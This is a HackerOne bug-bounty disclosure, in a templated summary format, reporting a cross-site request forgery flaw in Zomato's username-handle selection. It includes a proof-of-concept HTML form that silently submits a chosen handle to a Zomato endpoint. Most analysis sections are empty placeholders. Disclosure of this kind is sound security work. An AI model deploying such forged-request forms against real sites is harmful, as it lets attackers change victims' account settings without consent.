# CSRF AT SELECTING ZAMATO HANDLE

## Metadata
- **Source:** HackerOne
- **Report:** 113857 | https://hackerone.com/reports/113857
- **Submitted:** 2016-02-01
- **Reporter:** kiraak-boy
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** unknown
- **Vuln:** Cross-Site Request Forgery (CSRF)
- **CVEs:** None
- **Category:** web-api

## Summary
Hello,

Your Application Have Feature To Choose Zomato Handle 


POC:-

<html>
  <body>
    <form action="https://www.zomato.com/php/username_selector.php" method="POST">
      <input type="hidden" name="uname" value="googlessssssssssx" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

Thanks!


## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

Hello,

Your Application Have Feature To Choose Zomato Handle 


POC:-

<html>
  <body>
    <form action="https://www.zomato.com/php/username_selector.php" method="POST">
      <input type="hidden" name="uname" value="googlessssssssssx" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

Thanks!


</details>

---
*Analysed by Claude on 2026-05-24*
